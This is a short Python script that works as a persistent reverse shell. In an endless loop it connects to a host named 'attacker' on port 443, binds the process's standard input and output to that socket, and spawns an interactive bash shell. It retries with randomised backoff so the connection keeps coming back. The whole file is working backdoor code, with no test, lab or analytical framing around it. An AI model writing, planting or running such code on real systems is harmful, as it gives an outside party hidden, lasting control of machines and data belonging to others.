import socket
import os
import pty
import time
import random

wait = 5
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("attacker", 443))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
        wait = 5
    except OSError:
        pass
    finally:
        s.close()
    time.sleep(wait + random.randint(0, 10))
    wait = min(wait * 2, 600)
